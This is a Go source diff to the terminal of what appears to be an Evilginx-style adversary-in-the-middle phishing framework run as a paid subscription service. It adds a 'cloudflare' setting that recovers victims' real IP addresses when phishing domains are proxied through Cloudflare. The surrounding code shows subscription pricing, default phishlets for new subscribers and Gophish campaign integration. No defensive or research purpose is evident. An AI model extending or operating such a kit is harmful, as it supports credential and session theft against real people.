@@ -313,6 +313,18 @@ func (t *Terminal) handleConfig(args []string) error {
 			t.cfg.cfg.WriteConfig()
 			log.Info("subscription price set to $%d/month", p)
 			return nil
+		case "cloudflare":
+			switch strings.ToLower(strings.TrimSpace(args[1])) {
+			case "on", "true", "enable":
+				t.cfg.SetCloudflareMode(true)
+				log.Info("cloudflare mode enabled — real IPs read from CF-Connecting-IP header")
+			case "off", "false", "disable":
+				t.cfg.SetCloudflareMode(false)
+				log.Info("cloudflare mode disabled")
+			default:
+				return fmt.Errorf("cloudflare: expected 'on' or 'off'")
+			}
+			return nil
 		case "default_phishlet":
 			t.cfg.general.DefaultPhishlet = strings.TrimSpace(args[1])
 			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
@@ -1618,6 +1630,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"sub_price"}, "sub_price <usd>", "set subscription price in USD per month (default: 150)")
 	h.AddSubCommand("config", []string{"default_phishlet"}, "default_phishlet <name>", "set the default phishlet assigned to new subscriptions")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
+	h.AddSubCommand("config", []string{"cloudflare"}, "cloudflare <on|off>", "enable when domain is proxied through Cloudflare — reads real visitor IP from CF-Connecting-IP header")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
